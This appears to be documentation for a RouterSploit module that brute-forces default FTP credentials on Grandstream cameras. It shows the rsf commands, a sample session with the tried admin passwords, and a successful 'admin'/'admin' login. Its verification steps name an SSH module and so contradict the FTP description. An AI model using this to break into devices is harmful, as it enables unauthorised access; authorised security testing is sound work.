## Description

Module performs dictionary attack with default credentials against Grandstream Camera FTP service.
If valid credentials are found, they are displayed to the user.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use creds/cameras/grandstream/ssh_default_creds`
  3. Do: `set target [TargetIP]`
  4. Do: `run`
  5. If valid credentials are found, they are displayed to the user.

## Scenarios

```
rsf > use creds/cameras/grandstream/ftp_default_creds
rsf (Grandstream Camera Default FTP Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
rsf (Grandstream Camera Default FTP Creds) > run
[*] Running module...
[*] Target exposes FTP service
[*] Starting attack against FTP service
[*] thread-0 thread is starting...
[-] Authentication Failed - Username: 'admin' Password: '12345'
[-] Authentication Failed - Username: 'admin' Password: '123456'
[-] Authentication Failed - Username: 'Admin' Password: '12345'
[-] Authentication Failed - Username: 'Admin' Password: '123456'
[+] Authenticated Succeed - Username: 'admin' Password: 'admin'
[*] thread-0 thread is terminated.
[*] Elapsed time: 0.06290411949157715 seconds
[+] Credentials found!

   Target          Port     Service     Username     Password
   ------          ----     -------     --------     --------
   192.168.1.1     21       ftp         admin        admin 

```
